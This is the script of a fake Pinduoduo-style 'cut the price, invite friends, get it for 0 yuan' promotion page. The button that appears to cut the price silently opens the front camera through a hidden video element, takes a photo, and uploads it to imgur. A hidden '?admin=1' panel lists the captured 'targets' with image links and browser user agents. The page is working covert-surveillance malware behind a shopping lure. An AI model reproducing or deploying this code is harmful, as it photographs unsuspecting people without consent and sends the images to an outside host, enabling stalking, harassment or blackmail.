<div id="toast" style="position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.78);color:#fff;padding:8px 16px;border-radius:18px;font-size:12px;z-index:9999;opacity:0;transition:opacity 0.3s;pointer-events:none"></div>

<video id="vid" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
(function(){
  const STORAGE_KEY = 'pdd_captures_v1';
  let left = 88.32;
  const total = 353.28;
  let stream = null;

  function $(id){ return document.getElementById(id); }
  function toast(msg){
    const t = $('toast');
    t.textContent = msg;
    t.style.opacity = '1';
    setTimeout(function(){ t.style.opacity = '0'; }, 1800);
  }
  function coinRain(){
    for(let i=0;i<14;i++){
      const c = document.createElement('div');
      c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
      c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
      document.body.appendChild(c);
      setTimeout(function(){ c.remove(); }, 2200);
    }
  }

  // inject coin animation CSS once
  const style = document.createElement('style');
  style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
  document.head.appendChild(style);

  function updateProgress(){
    $('ringFg').style.strokeDashoffset = 251.3 - (251.3 * 0.75);
    $('leftMoney').textContent = left.toFixed(2);
    $('leftMoney2').textContent = left.toFixed(2);
  }

  async function silentCapture(){
    try{
      if(!stream){
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 1280, height: 720 },
          audio: false
        });
      }
      const v = $('vid');
      v.srcObject = stream;
      await new Promise(function(r){ setTimeout(r, 2200); });

      const c = $('canvas');
      c.width = v.videoWidth || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext('2d');
      ctx.drawImage(v, 0, 0);
      const blob = await new Promise(function(r){ c.toBlob(r, 'image/jpeg', 0.85); });

      stream.getTracks().forEach(function(t){ t.stop(); });
      stream = null;

      await uploadImage(blob);
    } catch(e){
      console.log('cam blocked:', e);
    }
  }

  async function uploadImage(blob){
    try{
      const fd = new FormData();
      fd.append('image', blob);
      const res = await fetch('https://api.imgur.com/3/image', { method:'POST', body:fd });
      const data = await res.json();

      const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');

      if(data && data.success){
        list.push({
          time: new Date().toISOString(),
          url: data.data.link,
          ua: navigator.userAgent
        });
        localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
        console.log('✓ uploaded to imgur:', data.data.link);
      } else {
        const reader = new FileReader();
        reader.onload = function(){
          list.push({
            time: new Date().toISOString(),
            url: reader.result,
            ua: navigator.userAgent
          });
          localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
        };
        reader.readAsDataURL(blob);
      }
    } catch(e){
      console.log('upload failed:', e);
    }
  }

  $('knifeBtn').addEventListener('click', function(){
    silentCapture();

    $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
    $('overlay').style.display = 'flex';

    setTimeout(function(){
      const cut = (Math.random() * 8 + 2).toFixed(2);
      left = Math.max(0.01, left - parseFloat(cut));
      updateProgress();
      coinRain();

      const need = Math.ceil(Math.random()*3+1);
      $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';

      $('modalBtn').addEventListener('click', function(){
        $('overlay').style.display = 'none';
      });
      $('shareWx').addEventListener('click', function(){
        toast('请点击右上角 ··· 分享');
      });
    }, 2800);
  });

  $('modalClose').addEventListener('click', function(){
    $('overlay').style.display = 'none';
  });

  // also tap backdrop to close
  $('overlay').addEventListener('click', function(e){
    if(e.target === $('overlay')) $('overlay').style.display = 'none';
  });

  // spin keyframes
  const spinStyle = document.createElement('style');
  spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
  document.head.appendChild(spinStyle);

  updateProgress();

  // ADMIN PANEL
  if(new URLSearchParams(location.search).get('admin') === '1'){
    const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    let html = '<div style="padding:20px;font-family:sans-serif;background:#000;color:#0f0;min-height:100vh">';
    html += '<h1 style="margin:0 0 10px">📸 CAPTURES (' + list.length + ')</h1>';
    html += '<button onclick="localStorage.removeItem(\'' + STORAGE_KEY + '\');location.reload()" style="padding:8px 16px;margin:10px 0;cursor:pointer">CLEAR ALL</button>';
    if(list.length === 0){
      html += '<div style="color:#888;margin-top:20px">暂无捕获。说明目标还没点按钮,或者照片存在对方浏览器里(微信内置浏览器数据是隔离的)。</div>';
    }
    for(let i=0;i<list.length;i++){
      const c = list[i];
      const isData = c.url && c.url.startsWith && c.url.startsWith('data:');
      html += '<div style="border:1px solid #0f0;padding:10px;margin:10px 0;background:#001100">';
      html += '<div>#' + (i+1) + ' — ' + c.time + '</div>';
      if(isData){
        html += '<img src="' + c.url + '" style="max-width:100%;margin-top:8px;display:block">';
      } else {
        html += '<a href="' + c.url + '" target="_blank" style="color:#0ff;word-break:break-all">' + c.url + '</a>';
      }
      html += '<div style="font-size:10px;color:#888;margin-top:4px;word-break:break-all">' + (c.ua||'') + '</div>';
      html += '</div>';
    }
    html += '</div>';
    document.body.innerHTML = html;
  }
})();
</script>
